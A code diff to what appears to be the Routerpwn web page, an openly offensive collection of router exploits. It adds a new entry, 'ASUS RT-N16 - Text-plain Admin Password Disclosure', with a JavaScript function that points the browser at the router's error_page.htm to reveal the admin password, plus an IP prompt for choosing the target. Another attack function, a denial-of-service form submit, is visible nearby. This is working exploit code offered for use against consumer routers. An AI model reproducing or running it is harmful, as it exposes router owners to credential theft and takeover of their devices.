@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.13.212</title>
+		<title>Routerpwn 1.13.213</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link REL="SHORTCUT ICON" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -211,6 +211,12 @@ function hg866dosr() {
 	if (ip==null || ip==""){}else{
 		document.hg866dos.submit();
 	}
+}
+
+function rtn16_passdisclosure(ip)
+{
+    ip = ip || "192.168.1.1";
+    document.location="http://"+ip+"/error_page.htm";
 }
 
 // D-Link DWL-2100AP - Configuration Disclosure
@@ -2270,7 +2276,14 @@ a=a+1
 <input type="hidden" name="action_mode" value="apply">
 </form>
 <h2>Asus</h2>
-<h3><a href="javascript:img('RT-N66U')">RT-N66U</a>, <a href="javascript:img('RT-N56U')">RT-N56U</a>, <a href="javascript:img('RT-AC66U')">RT-AC66U</a></h3>
+<h3><a href="javascript:img('RT-N66U')">RT-N66U</a>, <a href="javascript:img('RT-N56U')">RT-N56U</a>, <a href="javascript:img('RT-AC66U')">RT-AC66U</a>, <a href="javascript:img('RT-N16')">RT-N16</a> </h3>
+
+<article>
+	<div>01/15/14</div>
+	<div><a href="https://sintonen.fi/advisories/asus-router-auth-bypass.txt">[+]</a></div>
+	<div><a href="javascript:rtn16_passdisclosure()">ASUS RT-N16 - Text-plain Admin Password Disclosure</a></div>
+	<div><a href="javascript:rtn16_passdisclosure(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>09/10/13</div>
